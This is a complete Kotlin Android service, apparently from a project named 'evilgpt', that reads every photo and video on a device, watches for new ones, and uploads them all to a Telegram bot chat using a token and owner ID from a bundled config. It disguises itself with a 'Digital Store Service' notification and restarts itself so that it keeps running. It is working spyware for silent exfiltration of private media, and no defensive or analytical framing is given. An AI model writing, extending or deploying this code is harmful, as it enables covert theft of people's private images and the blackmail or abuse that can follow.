package com.evilgpt.galleryuploader

import android.app.*
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.util.concurrent.TimeUnit

class UploadService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var okHttpClient: OkHttpClient
    private lateinit var database: UploadDatabase
    private lateinit var config: JSONObject

    private val handler = Handler(Looper.getMainLooper())
    private var observer: ContentObserver? = null

    companion object {
        private const val TAG = "UploadService"
        private const val NOTIFICATION_ID = 1337
        private const val CHANNEL_ID = "sync_channel"
    }

    override fun onCreate() {
        super.onCreate()
        okHttpClient = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build()
        database = UploadDatabase.getDatabase(this)
        config = loadConfig()
        createNotificationChannel()
        registerNetworkCallback()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification("Syncing media…")
        startForeground(NOTIFICATION_ID, notification)

        startMediaScanAndObserve()

        return START_STICKY
    }

    private fun loadConfig(): JSONObject {
        try {
            val inputStream = resources.openRawResource(R.raw.config)
            val reader = inputStream.bufferedReader()
            val text = reader.readText()
            reader.close()
            return JSONObject(text)
        } catch (e: Exception) {
            Log.e(TAG, "Error loading config", e)
            return JSONObject()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Sync Service Channel",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(message: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Digital Store Service")
            .setContentText(message)
            .setSmallIcon(android.R.drawable.ic_menu_upload)
            .setOngoing(true)
            .build()
    }

    private fun startMediaScanAndObserve() {
        serviceScope.launch {
            scanAndUploadAllMedia()
        }

        observer = object : ContentObserver(handler) {
            private var lastTriggerTime = 0L
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                val currentTime = System.currentTimeMillis()
                if (currentTime - lastTriggerTime > 2000) {
                    lastTriggerTime = currentTime
                    serviceScope.launch {
                        delay(2000)
                        scanAndUploadAllMedia()
                    }
                }
            }
        }

        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            observer!!
        )
        contentResolver.registerContentObserver(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            true,
            observer!!
        )
    }

    private suspend fun scanAndUploadAllMedia() {
        val botToken = config.optString("bot_token", "")
        val ownerId = config.optString("owner_id", "")
        if (botToken.isEmpty() || ownerId.isEmpty()) {
            Log.e(TAG, "Bot token or Owner ID is empty in config.json")
            return
        }

        val uploadedKeys = database.uploadDao().getAllUploadedKeys().toSet()
        val mediaList = queryMedia()

        for (item in mediaList) {
            val key = "${item.id}:${item.dateAdded}"
            if (uploadedKeys.contains(key)) continue

            try {
                val success = uploadMediaItem(botToken, ownerId, item)
                if (success) {
                    database.uploadDao().insert(UploadedFile(key, System.currentTimeMillis()))
                }
                delay(1500)
            } catch (e: Exception) {
                Log.e(TAG, "Failed uploading file ${item.name}", e)
            }
        }
    }

    data class MediaItem(
        val id: Long,
        val uri: android.net.Uri,
        val name: String,
        val mimeType: String,
        val dateAdded: Long,
        val size: Long,
        val isVideo: Boolean
    )

    private fun queryMedia(): List<MediaItem> {
        val list = mutableListOf<MediaItem>()

        // Images
        val imageProjection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.SIZE
        )
        contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            imageProjection,
            null,
            null,
            null
        )?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE)
            val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
            val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                val name = cursor.getString(nameCol) ?: "image_$id.jpg"
                val mime = cursor.getString(mimeCol) ?: "image/jpeg"
                val date = cursor.getLong(dateCol)
                val size = cursor.getLong(sizeCol)
                val uri = android.content.ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    id
                )
                list.add(MediaItem(id, uri, name, mime, date, size, false))
            }
        }

        // Videos
        val videoProjection = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.MIME_TYPE,
            MediaStore.Video.Media.DATE_ADDED,
            MediaStore.Video.Media.SIZE
        )
        contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            videoProjection,
            null,
            null,
            null
        )?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
            val mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.MIME_TYPE)
            val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_ADDED)
            val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                val name = cursor.getString(nameCol) ?: "video_$id.mp4"
                val mime = cursor.getString(mimeCol) ?: "video/mp4"
                val date = cursor.getLong(dateCol)
                val size = cursor.getLong(sizeCol)
                val uri = android.content.ContentUris.withAppendedId(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    id
                )
                list.add(MediaItem(id, uri, name, mime, date, size, true))
            }
        }

        return list
    }

    private fun uploadMediaItem(token: String, chatId: String, item: MediaItem): Boolean {
        val fileField = when {
            item.size > 50 * 1024 * 1024 -> "document"
            item.isVideo -> "video"
            else -> "photo"
        }

        val endpoint = when (fileField) {
            "document" -> "https://api.telegram.org/bot$token/sendDocument"
            "video" -> "https://api.telegram.org/bot$token/sendVideo"
            else -> "https://api.telegram.org/bot$token/sendPhoto"
        }

        val inputStream = contentResolver.openInputStream(item.uri) ?: return false
        val tempFile = File(cacheDir, item.name)
        try {
            FileOutputStream(tempFile).use { output ->
                inputStream.copyTo(output)
            }
            inputStream.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error copying stream to temp file", e)
            return false
        }

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart(
                fileField,
                item.name,
                tempFile.asRequestBody(item.mimeType.toMediaTypeOrNull())
            )
            .build()

        val request = Request.Builder()
            .url(endpoint)
            .post(requestBody)
            .build()

        try {
            val response = okHttpClient.newCall(request).execute()
            val responseCode = response.code
            val bodyString = response.body?.string() ?: ""
            response.close()

            Log.i(TAG, "Uploaded ${item.name} ($responseCode): $bodyString")

            if (responseCode == 401) {
                Log.e(TAG, "Invalid bot token (401)")
                return false
            }

            if (responseCode == 429) {
                try {
                    val json = JSONObject(bodyString)
                    val retryAfter = json.optInt("retry_after", 5)
                    Thread.sleep((retryAfter * 1000).toLong())
                } catch (ignored: Exception) {
                    Thread.sleep(5000)
                }
                tempFile.delete()
                return uploadMediaItem(token, chatId, item)
            }

            tempFile.delete()
            return response.isSuccessful
        } catch (e: Exception) {
            Log.e(TAG, "Network exception uploading ${item.name}", e)
            tempFile.delete()
            return false
        }
    }

    private fun registerNetworkCallback() {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val request = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()

        connectivityManager.registerNetworkCallback(request, object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                super.onAvailable(network)
                serviceScope.launch {
                    scanAndUploadAllMedia()
                }
            }
        })
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        observer?.let { contentResolver.unregisterContentObserver(it) }
        serviceScope.cancel()
    }
}
